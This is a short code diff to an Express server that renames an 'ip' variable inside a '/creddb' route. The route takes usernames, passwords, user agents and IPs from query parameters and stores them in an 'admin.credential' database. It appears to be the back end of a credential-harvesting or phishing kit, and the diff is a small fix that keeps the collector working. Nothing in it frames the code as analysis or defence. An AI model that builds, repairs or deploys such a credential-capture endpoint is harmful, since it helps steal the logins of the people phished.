@@ -3,7 +3,7 @@ const routes = express.Router();
 const CONST = require('./const');
 const { exec } = require("child_process");
 const app = express();
-var ip = require("ip");
+const ip = require("ip");
 const cookieParser = require('cookie-parser');
 const lowdb = require('lowdb');
 const bodyParser = require('body-parser');
@@ -64,13 +64,13 @@ routes.get('/creddb',(req,res)=>{
     username = req.query.username;
     password = req.query.password;
     useragent = req.query.useragent;
-    ip = req.query.ip;
+    ips = req.query.ip;
     db.get('admin.credential').push({
                 credtype:cred_type,
                 username: username,
                 password: password,
                 useragent: useragent,
-                ip: ip,
+                ip: ips,
                 time:date_time.toISOString()
             }).write()
     res.send('Hello World!');
